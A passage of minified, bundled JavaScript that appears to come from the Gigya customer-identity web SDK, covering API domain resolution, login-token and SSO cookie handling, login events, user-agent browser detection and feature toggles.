        u = i(3),
        c = i(2),
        l = i(12);
      (null === (o = null === (n = window.gigya.partnerSettings) || void 0 === n ? void 0 : n.baseDomains) || void 0 === o ? void 0 : o.length) ? r = window.gigya.partnerSettings.baseDomains : (window.self === window.top && window.gigya.logger.warn("gigya: missing base domains for site"), r = [document.location.hostname]), u.localInfo.baseDomain = f(r);
      var g = ["socialize", "accounts", "fidm", "gm", "comments", "gcs", "ids", "ds", "gscounters", "reports"];
      function d(e, t, i) {
        void 0 === t && (t = window.gigya.dataCenter), void 0 === i && (i = window.gigya.defaultApiDomain), "sapcdm.cn" === i && "cn1" !== t && (i = "cn1." + i);
        var n = t + "." + i;
        return e ? e + "." + n : n;
      }
      function f(e, t, i) {
        if (void 0 === e && (e = window.gigya.partnerSettings.baseDomains), void 0 === t && (t = location.hostname), void 0 === i && (i = ["gigya.com", "cn1.sapcdm.cn", "localhost", window.gigya.defaultApiDomain]), !t) return "";
        "string" == typeof e && (e = e.split(","));
        var n = a.Uri.parse(t);
        i && (e = e.concat(i));
        for (var o = 0, r = e; o < r.length; o++) {
          var u = r[o],
            c = s.replaceAll(u, "*", ""),
            l = a.Uri.parse(c);
          if (l && n.isIn(l)) return window.gigya._ || (window.gigya._ = {}), window.gigya._.isTrustedDomain = !0, l.isForSubDomains() ? n.domain : l.domain;
        }
        return n.domain;
      }
      function p(e, t, i, n) {
        var o;
        void 0 === e && (e = window.gigya.partnerSettings && window.gigya.partnerSettings.customAPIDomainPrefix), void 0 === t && (t = u.localInfo.baseDomain), void 0 === i && (i = window.gigya.dataCenter), void 0 === n && (n = window.gigya.defaultApiDomain);
        var r = h();
        return r || (t.endsWith((null === (o = window.gigya._.config) || void 0 === o ? void 0 : o.hostedPagesDomain) || "my.gigya-ext.com") ? t : e && t && t !== n ? e + "." + t : d(void 0, i, n));
      }
      function h() {
        return l.default.get("pages_apiDomain_" + window.gigya.apiKey);
      }
      t.apiDomainFactory = function (e, t) {
        void 0 === e && (e = p()), void 0 === t && (t = window.gigya.defaultApiDomain);
        var i = a.Uri.parse(e).isIn(a.Uri.parse(t));
        return function (t) {
          if (t && i) {
            var n = t.split(".")[0];
            return "sdk" === n || "oauth" === n ? n = "accounts" : -1 == g.indexOf(n) && (window.gigya.logger.error("trying to send request to an invalid domain"), n = g[0]), n + "." + e;
          }
          return e;
        };
      }, t.getGigyaDomain = d, t.getBaseDomain = f, t.resolveApiDomain = p, t.getStorageDomain = function () {
        var e,
          t,
          i,
          n = h();
        if (n) return n;
        if (null === (t = null === (e = window.gigya.thisScript) || void 0 === e ? void 0 : e.globalConf) || void 0 === t ? void 0 : t.storageDomainOverride) return window.gigya.thisScript.globalConf.storageDomainOverride;
        if ((null === (i = window.gigya.thisScript) || void 0 === i ? void 0 : i.baseDomain) && c.FlagService.useGigyaJsBaseDomain) return window.gigya.thisScript.baseDomain;
        var o = window.gigya.defaultApiDomain;
        return window.gigya.utils.stringUtils.endsWith(o, "sapcdm.cn") && "cn1" !== window.gigya.dataCenter && (o = "cn1.sapcdm.cn"), ("global" !== window.gigya.dataCenter ? "cdns." + window.gigya.dataCenter : "cdns") + "." + o;
      };
    },
    23: function (e, t) {
      var i;
      i = function () {
        return this;
      }();
      try {
        i = i || new Function("return this")();
      } catch (e) {
        "object" == typeof window && (i = window);
      }
      e.exports = i;
    },
    24: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n,
        o = i(0),
        r = i(31),
        a = i(42),
        s = i(2),
        u = null,
        c = {};
      function l(e) {
        return void 0 === e && (e = window.gigya.thisScript.APIKey), window.gigya.utils.cookie.get(g(e));
      }
      function g(e) {
        return "gltexp_" + e;
      }
      function d(e) {
        return void 0 === e && (e = window.gigya.thisScript.APIKey), e ? "glt_" + e : "_gig_lt";
      }
      function f(e) {
        void 0 === e && (e = window.gigya.thisScript.APIKey);
        var t = window.gigya.utils.cookie.get(d(e));
        return t ? t.split("|")[0] : null;
      }
      function p(e, t, i, o) {
        window.gigya.utils.localStorage.removeItem("gigyaSettings"), window.gigya.logger.info("setting a new login token"), e || (e = window.gigya.thisScript.APIKey), e ? (s.FlagService.setCookieSameSiteLaxSession ? window.gigya.utils.cookie.set("glt_" + e, t, i, null, null, "Lax") : window.gigya.utils.cookie.set("glt_" + e, t, i), window.gigya.utils.cookie.remove("gac_" + e)) : s.FlagService.setCookieSameSiteLaxSession ? window.gigya.utils.cookie.set("_gig_lt", t, i, null, null, "Lax") : window.gigya.utils.cookie.set("_gig_lt", t, i), n = o;
      }
      function h() {
        return window.gigya.thisScript.APIKey && window.gigya.utils.cookie.get("gac_" + window.gigya.thisScript.APIKey);
      }
      function y(e, t, i) {
        if (void 0 === i && (i = h()), window.gigya.thisScript.APIKey) {
          if (i && !e.neverTryGAC) {
            if ('"' === i.charAt(0) && '"' === i.charAt(i.length - 1) && (i = i.substring(1, i.length - 1)), c[i]) return void t();
            c[i] = !0, window.gigya.socialize.updateRefUID(), window.gigya.socialize.notifyLogin({
              ignoreApiQueue: !0,
              neverTryGAC: !0,
              authCode: i,
              APIKey: window.gigya.thisScript.APIKey,
              client_id: window.gigya.thisScript.APIKey
            }, {
              callback: function () {
                window.gigya.utils.cookie.remove("gac_" + window.gigya.thisScript.APIKey), t(), window.gigya.socialize.refreshUI({
                  neverTryGAC: !0
                });
              }
            });
          } else t();
        } else t();
      }
      function v(e) {
        return void 0 === e && (e = {}), o.__awaiter(this, void 0, void 0, function () {
          var t = this;
          return o.__generator(this, function (i) {
            return [2, new gigya.Promise(function (i) {
              window.gigya.utils.queue.hold("verifyLogin", "API"), window.gigya.accounts.verifyLogin({
                ignoreApiQueue: !0,
                suppressLoginEvent: !0,
                include: window.gigya.utils.stringUtils.mergeCommaSeparatedValues("profile,data", window.gigya.thisScript.globalConf.include),
                extraProfileFields: "samlData",
                callback: function (n) {
                  window.gigya.utils.queue.release("verifyLogin", "API"), a.sessionData.setIsSessionVerified(f(), 0 == n.errorCode);
                  var r = n.source;
                  window.gigya.events.global.dispatchWhenHandlerAdded({
                    eventName: "socialize.login"
                  }, null, function (t, i) {
                    t || (t = {}), t = window.gigya.utils.object.merge([t, e]), 0 == n.errorCode ? window.gigya.socialize.getUserInfo({
                      signIDs: !0,
                      extraFields: "samlData",
                      callback: function (e) {
                        0 == e.errorCode ? ((t = window.gigya._.addUserInfoToEvent(e, {
                          eventName: "login"
                        }, !0)).source = r, t.newUser = !1, t.provider = "site", t.loginMode = "standard", t.user && (t.user.errorCode = e.errorCode, t.user.callId = e.callId), n.id_token && (t.id_token = n.id_token)) : t.cancel = !0, i(t);
                      }
                    }) : (t.cancel = !0, i(t));
                  }), window.gigya.events.global.dispatchWhenHandlerAdded({
                    eventName: "accounts.login"
                  }, null, function (i, r) {
                    return o.__awaiter(t, void 0, void 0, function () {
                      return o.__generator(this, function (t) {
                        switch (t.label) {
                          case 0:
                            return i || (i = {}), i = window.gigya.utils.object.merge([i, e]), 0 != n.errorCode ? [3, 3] : (i.eventName = "accounts.login", n.UID ? [3, 2] : [4, new gigya.Promise(function (e) {
                              return window.gigya.accounts.getAccountInfo({
                                callback: e,
                                include: window.gigya.utils.stringUtils.mergeCommaSeparatedValues("profile,data", window.gigya.thisScript.globalConf.include)
                              });
                            })]);
                          case 1:
                            n = t.sent(), t.label = 2;
                          case 2:
                            return window.gigya.utils.object.extractProperties(n, i, "signature|UIDSig|timestamp|UIDSignature|signatureTimestamp|UID|profile|data|dataCenter|id_token|groups"), [3, 4];
                          case 3:
                            i.cancel = !0, t.label = 4;
                          case 4:
                            return r(i), [2];
                        }
                      });
                    });
                  }), i();
                }
              });
            })];
          });
        });
      }
      function w(e) {
        return void 0 === e && (e = window.gigya.thisScript.APIKey), o.__awaiter(this, void 0, void 0, function () {
          return o.__generator(this, function (t) {
            switch (t.label) {
              case 0:
                return f(e) && window.gigya.logger.info("removing login token"), window.gigya.utils.cookie.remove("glt_" + e), window.gigya.utils.cookie.remove("_gig_lt"), window.gigya.utils.cookie.remove("gltexp_" + e), window.gigya.partnerSettings.ssoKey ? (window.gigya.logger.info("removing group login token"), [4, r.SsoService.getInstance()]) : [3, 2];
              case 1:
                return [2, t.sent().removeToken()];
              case 2:
                return [2, gigya.Promise.resolve()];
            }
          });
        });
      }
      function m() {
        var e = window.gigya.utils.cookie.getDefaultDomain();
        return window.gigya.utils.stringUtils.endsWith(e, window.gigya.defaultApiDomain);
      }
      t.activeNamespaces = {}, t.isValidGltExp = function (e) {
        return void 0 === e && (e = l()), !e || window.gigya.utils.gltexp.isValid(e);
      }, t.getGltexpCookie = l, t.setGltexp = function (e, t) {
        void 0 === t && (t = window.gigya.thisScript.APIKey), e && !m() && (window.gigya.utils.cookie.remove(g(t)), s.FlagService.setCookieSameSiteLaxSession ? window.gigya.utils.cookie.set(g(t), e, null, null, null, "Lax") : window.gigya.utils.cookie.set(g(t), e));
      }, t.get = f, t.set = p, t.getCurrentSessionExpiration = function () {
        return n;
      }, t.getGACCookie = h, t.setFromAuthCode = function (e) {
        return o.__awaiter(this, void 0, void 0, function () {
          return o.__generator(this, function (t) {
            return [2, new gigya.Promise(function (t) {
              y({}, t, e);
            })];
          });
        });
      }, t.setFromGAC = y, t.setFromSsoResponse = function (e, t) {
        return void 0 === t && (t = window.gigya.thisScript.APIKey), o.__awaiter(this, void 0, void 0, function () {
          var i = this;
          return o.__generator(this, function (n) {
            return [2, new gigya.Promise(function (n) {
              return o.__awaiter(i, void 0, void 0, function () {
                var i, r, a;
                return o.__generator(this, function (o) {
                  switch (o.label) {
                    case 0:
                      if (!e) return [2];
                      switch (e.errorCode) {
                        case 403005:
                          return [3, 1];
                        case 403025:
                          return [3, 2];
                        case 403032:
                        case 0:
                          return [3, 3];
                        case 500026:
                          return [3, 5];
                      }
                      return [3, 6];
                    case 1:
                      return window.gigya.logger.info("no group session found"), w(t), [3, 7];
                    case 2:
                      return window.gigya.logger.info("existing group session was revoked"), w(t), window.gigya.events.global.dispatchWhenHandlerAdded({
                        eventName: "accounts.logout"
                      }), window.gigya.events.global.dispatchWhenHandlerAdded({
                        eventName: "logout"
                      }), [3, 7];
                    case 3:
                      return e.login_token ? (window.gigya.logger.info("new session from group"), i = void 0, r = void 0, e.groupContext && (r = JSON.parse(e.groupContext)), m() || (i = e.gltexp ? window.gigya.utils.cookie.getInfiniteExpirationTimeInSeconds() : e.expires_in, p(t, e.login_token, i), a = "gltexp_" + t, e.gltexp && !window.gigya.utils.cookie.get(a) && window.gigya.utils.cookie.set(a, e.gltexp)), [4, v({
                        expires_in: i,
                        groupContext: r
                      })]) : [2];
                    case 4:
                      return o.sent(), [3, 7];
                    case 5:
                      return window.gigya.logger.error("gigya: error loading sso frame", {
                        res: e
                      }), window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.error", "socialize.error"], e), [3, 7];
                    case 6:
                      throw window.gigya.logger.error("sso: unsupported response"), "gigya: unsupported response from sso";
                    case 7:
                      return n(), [2];
                  }
                });
              });
            })];
          });
        });
      }, t.dispatchLoginEvent = v, t.remove = w, t.getTokenParam = function (e, t) {
        var i = window.gigya.utils.cookie.get(d(e));
        if (i) {
          var n = i.split("|");
          return n.length > 1 ? window.gigya.utils.keyValue.deserialize(n[1])[t] : null;
        }
      }, t.setBearerToken = function (e) {
        window.gigya.logger.info("setting a new Bearer token"), u = "Bearer " + e;
      }, t.getBearerToken = function () {
        return u;
      }, t.removeBearerToken = function () {
        window.gigya.logger.info("Bearer token removed"), u = null;
      };
    },
    25: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), t.getParentUrl = function (e, t) {
        return void 0 === e && (e = window), void 0 === t && (t = document), e.location != e.parent.location ? t.referrer : t.location.href;
      }, t.getBodyElement = function (e) {
        return void 0 === e && (e = document), new gigya.Promise(function (t) {
          e.body ? t(e.body) : e.addEventListener("DOMContentLoaded", function () {
            return t(e.body);
          });
        });
      }, t.validateOrigin = function (e, t) {
        var i;
        return 0 === (null === (i = null == e ? void 0 : e.toLowerCase()) || void 0 === i ? void 0 : i.indexOf(null == t ? void 0 : t.toLowerCase()));
      }, t.createIframe = function (e, t) {
        void 0 === e && (e = "Gigya Frame"), void 0 === t && (t = document);
        var i = t.createElement("iframe");
        return i.style.position = "absolute", i.style.height = "0px", i.style.width = "0px", i.style.display = "none", i.title = e, i.setAttribute("aria-hidden", "true"), i;
      };
      var i = 1;
      t.generateId = function () {
        return String(i++);
      }, t.getAllClassMethodsNames = function (e) {
        var t = [],
          i = function (e) {
            return !!e.prototype;
          }(e) ? e.prototype : e;
        do {
          try {
            var n = Object.getOwnPropertyNames(i).map(function (e) {
              return e.toString();
            }).sort().filter(function (e, n, o) {
              return "function" == typeof i[e] && "constructor" !== e && (0 == n || e !== o[n - 1]) && -1 === t.indexOf(e);
            });
            t = t.concat(n);
          } catch (e) {
            for (var o = Object.getOwnPropertyNames(i).map(function (e) {
                return e.toString();
              }).sort(), r = (n = [], 0); r < o.length; r++) {
              var a = o[r];
              "function" != typeof i[a] || "constructor" === a || 0 != r && a === o[r - 1] || -1 !== t.indexOf(a) || n.push(a);
            }
            t = t.concat(n);
          }
        } while ((i = Object.getPrototypeOf(i)) && Object.getPrototypeOf(i));
        return t;
      };
    },
    26: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), t.isExplicitTrue = function (e) {
        var t = ("" + e).toLowerCase();
        return "true" == t || "1" == t;
      }, t.isExplicitFalse = function (e) {
        var t = ("" + e).toLowerCase();
        return "false" == t || "0" == t;
      }, t.isLaterThanNow = function (e) {
        return e > new Date().getTime();
      }, t.allDefinedOrAllUndefined = function () {
        for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
        var i = e.some(function (e) {
            return void 0 === e;
          }),
          n = e.some(function (e) {
            return void 0 !== e;
          });
        return n && !i || !n && i;
      };
    },
    27: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(3),
        r = i(24),
        a = i(14),
        s = i(5),
        u = i(4),
        c = i(10);
      function l(e) {
        return n.__awaiter(this, void 0, void 0, function () {
          return n.__generator(this, function (t) {
            return [2, new gigya.Promise(function (t) {
              window.gigya.accounts.groups.invitationConfirm({
                ignoreApiQueue: !0,
                invitationId: e,
                callback: t
              });
            })];
          });
        });
      }
      function g(e) {
        return n.__awaiter(this, void 0, void 0, function () {
          return n.__generator(this, function (t) {
            return [2, new gigya.Promise(function (t) {
              window.gigya.accounts.groups.finalizeInvitation({
                ignoreApiQueue: !0,
                token: e,
                callback: function (e) {
                  0 !== e.errorCode ? window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.error", "socialize.error"], e) : window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.finalizeGroupInvitation", "socialize.finalizeGroupInvitation"], e), t();
                }
              });
            })];
          });
        });
      }
      function d(e) {
        if (null != e.identities) {
          if (e.identities.constructor == Array) {
            var t = e.identities;
            e.identities = {};
            for (var i = 0; i < t.length; i++) e.identities[t[i].provider] = new window.gigya.socialize.Identity(t[i]);
          }
        } else e.identities = {};
      }
      !function (e) {
        e[e.LocalStorageListener = 0] = "LocalStorageListener", e[e.PostMessage = 1] = "PostMessage", e[e.Flash = 2] = "Flash";
      }(t.MessagingMethod || (t.MessagingMethod = {})), t.checkCompleteRegistration = function (e, t, i, n) {
        var r,
          a,
          s,
          u = !1;
        if (206005 == e.errorCode) window.gigya.logger.info("finalizing registration after email verification"), u = !0, window.gigya.accounts.finalizeRegistration({
          regToken: e.regToken,
          ignoreApiQueue: !0,
          callback: n
        });else if (!t.ignoreInterruptions && !t.dontHandleScreenSet && ((e.regToken || t.regToken) && (200010 == e.errorCode || 409003 == e.errorCode || 403043 == e.errorCode) || 206001 == e.errorCode || 206002 == e.errorCode || 206003 == e.errorCode || 403101 == e.errorCode || 403102 == e.errorCode || 403110 == e.errorCode || 403100 == e.errorCode || 206006 == e.errorCode)) {
          var c;
          409003 == e.errorCode && (s = {
            access_token: e.access_token,
            provider: e.provider,
            provider_uid: e.provider_uid,
            idToken: e.id_token,
            code: e.code,
            lastName: e.lastName,
            firstName: e.firstName
          }), 403110 == e.errorCode && (a = !0, c = !0), t.defaultMobileRegScreenSet && o.localInfo.isMobile ? r = t.defaultMobileRegScreenSet : t.defaultRegScreenSet && (r = t.defaultRegScreenSet);
        }
        r ? (window.gigya.logger.info("showing screenset '" + r + "' for errorCode " + e.errorCode), window.gigya.logger.group(r), window.gigya.accounts.showScreenSet({
          ignoreApiQueue: !0,
          newModal: c,
          screenSet: r,
          initialMethod: i,
          initialResponse: e,
          suppressLoginEvent: t.suppressLoginEvent,
          providerSessionInfo: s,
          onError: function (t) {
            n(e);
          },
          onHide: function (t) {
            if (window.gigya.logger.groupEnd(r), "finished" === t.reason && t.user) {
              var i = {
                errorCode: 0,
                userInfo: t.user,
                source: t.source
              };
              n(i, !0, a);
            } else n(e);
          }
        })) : u || n(e);
      }, t.checkGroupInvitation = function (e) {
        return n.__awaiter(this, void 0, void 0, function () {
          var t, i;
          return n.__generator(this, function (a) {
            switch (a.label) {
              case 0:
                return e.invitationId || window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.error", "socialize.error"], {
                  status: "MISSING_REQUIRED_PARAMETER",
                  statusMessage: "Missing required parameter: invitationId",
                  errorCode: 400002,
                  errorMessage: "Missing required parameter: invitationId"
                }), [4, l(e.invitationId)];
              case 1:
                return (t = a.sent()).token ? [3, 2] : (window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.error", "socialize.error"], t), [3, 5]);
              case 2:
                return null !== r.get() ? [3, 3] : (window.gigya.accounts.addEventHandlers({
                  onLogin: function () {
                    return n.__awaiter(this, void 0, void 0, function () {
                      return n.__generator(this, function (e) {
                        switch (e.label) {
                          case 0:
                            return [4, g(t.token)];
                          case 1:
                            return e.sent(), [2];
                        }
                      });
                    });
                  }
                }), i = o.localInfo.isMobile ? window.gigya.thisScript.globalConf.defaultMobileRegScreenSet : window.gigya.thisScript.globalConf.defaultRegScreenSet, window.gigya.accounts.showScreenSet({
                  ignoreApiQueue: !0,
                  screenSet: i
                }), [3, 5]);
              case 3:
                return [4, g(t.token)];
              case 4:
                a.sent(), a.label = 5;
              case 5:
                return [2];
            }
          });
        });
      }, t.getGigyaSettings = function (e) {
        var t = a.getObject("gigyaSettings");
        return s.serialize(t[e]);
      }, t.setGigyaSettings = function (e, t) {
        var i,
          n = a.getObject("gigyaSettings", ((i = {})[e] = {}, i));
        for (var o in t) n[e][o] = t[o];
        a.setItem("gigyaSettings", s.serialize(n));
      }, t.delGigyaSettings = function (e) {
        if (e) {
          var t = a.getObject("gigyaSettings");
          t && (delete t[e], a.setItem("gigyaSettings", s.serialize(t)));
        } else a.removeItem("gigyaSettings");
      }, t.handleSpecialFields = function (e) {
        var t = window.gigya.socialize.Collection,
          i = function (e, t) {
            for (var i = [], n = 0, o = e[n]; o;) i.push(new t(o)), i[n].identities && d(i[n]), o = e[++n];
            return i;
          };
        if (e.photos && (e.photos = new t(e.photos, "photoID")), e.albums && (e.albums = new t(e.albums, "albumID")), e.contacts && (e.contacts = new t(i(e.contacts, window.gigya.socialize.Contact), "email")), e.friend && (e.friend = new t(i(e.friend, window.gigya.socialize.Friend), "UID")), e.user && (e.user = new window.gigya.socialize.User(e.user)), e.friends && e.friends instanceof Array) {
          for (var n = [], o = 0; o < e.friends.length; o++) n.push(e.friends[o].UID);
          e.UIDs = n.join(","), e.friends = new t(i(e.friends, window.gigya.socialize.Friend), "UID");
        }
      }, t.convertIdentitiesArrayToObject = d, t.addUserInfoToEvent = function (e, t, i, n) {
        var o = e.user || e.userInfo;
        return null == t && (t = {}), null != o && (t.user = u.clone(o), null != e.isLoggedIn && (t.user.isLoggedIn = e.isLoggedIn), null != e.isSiteUID && (t.user.isSiteUID = e.isSiteUID), null != e.iRank && (t.user.iRank = e.iRank)), i && (u.extractProperties(e, t, "signature|UIDSig|timestamp|UIDSignature|signatureTimestamp|UID|signKeysUIDSignature|dataCenter|id_token|groups"), null != t.user && (t.UID = o.UID, t.isSiteUID = o.isSiteUID)), t;
      }, t.sendEmailNative = function (e) {
        var t = e.userAction || {},
          i = t.title || "",
          n = t.linkBack || "";
        document.location.href = "mailto:?to=&subject=" + c.URLEncode(i) + "&body=" + c.URLEncode(n), window.gigya.socialize.sendEmail(e, {
          dontSendEmail: !0
        });
      };
    },
    28: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i = function () {
        function e(e) {
          void 0 === e && (e = window), this._win = e;
        }
        return e.prototype.setCookie = function (e, t, i) {
          var n = e + "=" + escape(t);
          i.path && (n += "; path=" + i.path), i.expires && (n += "; expires=" + i.expires.toUTCString()), i.domain && -1 != i.domain.indexOf(".") && (n += "; domain=" + i.domain), i.sameSite && (n += "; sameSite=" + i.sameSite), i.secure && (n += "; secure"), this._win.document.cookie = n;
        }, e.prototype.getCookie = function (e) {
          e = e.replace(/([.*+?^=!:${}()|[\]\/\\])/g, "\\$1").replace(/^[ \t]+|[ \t]+$/g, "");
          var t = new RegExp("(?:^|;)\\s?" + e + "=(.*?)(?:;|$)"),
            i = this._win.document.cookie.match(t);
          return i && unescape(i[1]);
        }, e;
      }();
      t.CookieStore = i;
    },
    3: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = navigator.userAgent.toLowerCase();
      t.localInfo = {
        baseDomain: "",
        isBrowserSupportsFilesAPI: "function" == typeof FileReader || "object" == typeof FileReader,
        initTime: new Date(),
        version: 0,
        pageDomain: document.location.hostname,
        protocol: "http:" == document.location.protocol ? "http" : "https",
        userAgent: o,
        isWin: -1 != o.indexOf("win"),
        isIE: -1 != o.indexOf("msie") || -1 != o.indexOf("mozilla") && -1 != o.indexOf("trident"),
        isIE6: -1 != o.indexOf("msie 6."),
        isIE7: -1 != o.indexOf("msie 7."),
        isIE8: -1 != o.indexOf("msie 8."),
        isIE9: -1 != o.indexOf("msie 9."),
        isIE10: -1 != o.indexOf("msie 10."),
        isIE11: -1 != o.indexOf("mozilla") && -1 != o.indexOf("trident/7.0"),
        isEdgeLegacy: -1 != o.indexOf("edge"),
        isEdge: RegExp(/edg(?!e)/).test(o),
        isIOS: -1 != o.indexOf("iphone") || -1 != o.indexOf("ipad") || -1 != o.indexOf("ipod"),
        isSafari534: -1 != o.indexOf("safari/534"),
        isWeChat: -1 != o.indexOf("micromessenger"),
        iosVersion: -1 != o.indexOf("applewebkit") && -1 != o.indexOf("version/") ? parseInt(o.split("version/")[1].split(" ")[0]) : 0,
        isAndroid: -1 != o.indexOf("android"),
        isAndroidBrowser: function (e) {
          if (-1 === e.indexOf("mozilla/5.0")) return !1;
          if (-1 === e.indexOf("android 4")) return !1;
          if (-1 === e.indexOf("applewebkit")) return !1;
          if (-1 !== e.indexOf("windows phone")) return !1;
          var t = /chrome\/(\d+)/.exec(e);
          return !t || parseInt(t[1]) < 20;
        }(o),
        currentBrowser: "",
        androidVersion: -1 != o.indexOf("android") ? parseFloat(o.slice(o.indexOf("android") + 8)) : 0,
        isChrome: -1 != o.indexOf("chrome") && -1 == o.indexOf("edg"),
        isGoogleBot: -1 != o.indexOf("googlebot"),
        isFF: -1 != o.indexOf("firefox"),
        isOpera: -1 != o.indexOf("opera"),
        isSafari: navigator.appVersion && -1 != navigator.appVersion.toLowerCase().indexOf("safari") && -1 == navigator.appVersion.toLowerCase().indexOf("chrome") && -1 == o.indexOf("android"),
        isIOSWebView: /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(navigator.userAgent),
        isIOSChrome: -1 != o.indexOf("crios"),
        isMAC: navigator.appVersion && -1 != navigator.appVersion.toLowerCase().indexOf("mac"),
        isWindowsPhone: -1 != o.indexOf("windows phone"),
        isFacebookBrowser: -1 != o.indexOf("fban") || -1 != o.indexOf("fbav"),
        supportsPostMessage: null != window.postMessage && (-1 == o.indexOf("msie") || -1 != o.indexOf("iemobile")),
        supportsLocalStorage: !1,
        supportsSessionStorage: !1,
        supportsFlash: function () {
          var e = !1;
          try {
            if (navigator.mimeTypes && null != navigator.mimeTypes["application/x-shockwave-flash"] && navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin) e = !0;else new ActiveXObject("ShockwaveFlash.ShockwaveFlash") && (e = !0);
          } catch (e) {}
          return e;
        }(),
        quirksMode: "BackCompat" == document.compatMode && -1 != o.indexOf("msie"),
        backCompat: "BackCompat" == document.compatMode,
        isMobile: function () {
          var e = ["iphone", "ipod", "android", "midp", "240x320", "blackberry", "netfront", "nokia", "panasonic", "portalmmm", "sharp", "sie-", "sonyericsson", "symbian", "windows ce", "benq", "mda", "mot-", "opera mini", "philips", "pocket pc", "sagem", "samsung", "htc"];
          for (var t in e) if (-1 != o.indexOf(e[t])) return !0;
          return !1;
        }(),
        isMobileApp: function () {
          if (!document.getElementsByTagName) return !1;
          for (var e = document.getElementsByTagName("meta"), t = 0; t < e.length; t++) if ("viewport" == e[t].getAttribute("name")) {
            var i = e[t].getAttribute("content");
            if (i && -1 !== i.indexOf("width=device-width")) return !0;
          }
          return !1;
        }(),
        isNativeMobileApp: !1,
        isTouch: function () {
          if ("ontouchstart" in window) return !0;
          if ("onmsgesturechange" in window) try {
            return new ActiveXObject("htmlfile"), !1;
          } catch (e) {
            return !0;
          }
          return !1;
        }(),
        isOnLine: function () {
          return navigator.onLine;
        },
        messagingMethod: 1
      };
      var r = function (e) {
        try {
          var t = window[e];
          if (!t) return !1;
          var i = "_gig_localStorage_test",
            n = "just checking for localStorage";
          t.setItem(i, n);
          var o = t.getItem(i) === n;
          return t.removeItem(i), o;
        } catch (e) {
          return !1;
        }
      };
      t.localInfo.supportsLocalStorage = r("localStorage"), t.localInfo.supportsSessionStorage = r("sessionStorage"), t.localInfo.isMAC = t.localInfo.isMAC && !t.localInfo.isIOS;
      var a = t.localInfo.isWin ? "windows" : t.localInfo.isWindowsPhone ? "winphone" : t.localInfo.isIOS ? "ios-v" + t.localInfo.iosVersion : t.localInfo.isMAC ? "mac" : t.localInfo.isAndroid ? "android" : "";
      a && (a += " ");
      var s = t.localInfo.isChrome ? "chrome" : t.localInfo.isFF ? "firefox" : t.localInfo.isSafari ? "safari" : t.localInfo.isEdge ? "edge" : t.localInfo.isEdgeLegacy ? "edge legacy" : t.localInfo.isIE11 ? "ie11" : t.localInfo.isIE10 ? "ie10" : t.localInfo.isIE9 ? "ie9" : t.localInfo.isIE8 ? "ie8" : "";
      t.localInfo.currentBrowser = a + s;
      var u = function () {
        function e(e, t) {
          void 0 === e && (e = window.gigya._.WindowProvider.navigator()), void 0 === t && (t = window.gigya._.WindowProvider.screen()), this.navigator = e, this.screen = t, this.collectData();
        }
        return e.prototype.collectData = function () {
          var e, t, i, o, r, a, s;
          return n.__awaiter(this, void 0, void 0, function () {
            var u, c, l, g, d, f, p, h;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return this.userAgent = null === (e = this.navigator) || void 0 === e ? void 0 : e.userAgent, this.plugins = Array.from((null === (t = this.navigator) || void 0 === t ? void 0 : t.plugins) || []).map(function (e) {
                    return {
                      name: e.name,
                      filename: e.filename,
                      length: e.length
                    };
                  }), this.localTime = new Date().toLocaleTimeString(), this.timezoneOffset = new Date().getTimezoneOffset(), [4, null === (o = null === (i = this.navigator) || void 0 === i ? void 0 : i.permissions) || void 0 === o ? void 0 : o.query({
                    name: "notifications"
                  })];
                case 1:
                  return (u = n.sent()) && (c = u.state, this.permissionStatus = {
                    state: c
                  }), this.webdriver = null === (r = this.navigator) || void 0 === r ? void 0 : r.webdriver, (g = this.navigator.getBattery) ? [4, this.navigator.getBattery()] : [3, 3];
                case 2:
                  g = n.sent(), n.label = 3;
                case 3:
                  return (l = g) && (d = l.charging, f = l.chargingTime, p = l.dischargingTime, h = l.level, this.batteryInfo = {
                    charging: d,
                    chargingTime: f,
                    dischargingTime: p,
                    level: h
                  }), this.features = [(null === (a = this.navigator) || void 0 === a ? void 0 : a.maxTouchPoints) || (null === (s = this.navigator) || void 0 === s ? void 0 : s.msMaxTouchPoints), this.screen.width + "|" + this.screen.height + "|" + this.screen.colorDepth, this.navigator.javaEnabled(), "sendBeacon" in this.navigator], [2];
              }
            });
          });
        }, e;
      }();
      t.ClientFeature = u;
    },
    30: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(4),
        o = function () {
          function e() {}
          return e.prototype.has = function (e) {
            return void 0 !== this._toggles[e];
          }, e.prototype.get = function (e) {
            return this._toggles[e];
          }, e.prototype.isOn = function (e) {
            return this.has(e) && this.get(e);
          }, Object.defineProperty(e.prototype, "_toggles", {
            get: function () {
              return n.merge([this._globalConfToggles, this._webSdkConfigToggles]);
            },
            enumerable: !0,
            configurable: !0
          }), Object.defineProperty(e.prototype, "_globalConfToggles", {
            get: function () {
              var e, t;
              return (null === (t = null === (e = window.gigya.thisScript) || void 0 === e ? void 0 : e.globalConf) || void 0 === t ? void 0 : t.toggles) || {};
            },
            enumerable: !0,
            configurable: !0
          }), Object.defineProperty(e.prototype, "_webSdkConfigToggles", {
            get: function () {
              var e,
                t,
                i = (null === (t = null === (e = window.gigya._) || void 0 === e ? void 0 : e.config) || void 0 === t ? void 0 : t.toggles) || {};
              return Object.keys(i).reduce(function (e, t) {
                return e[t] = "on" === i[t], e;
              }, {});
            },
            enumerable: !0,
            configurable: !0
          }), e;
        }();
      t.default = new o();
    },
    31: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(46),
        r = i(22),
        a = i(25),
        s = i(2),
        u = i(48),
        c = 0;
      t._requestTimeout = 3e3;
      var l = function () {
        function e() {}
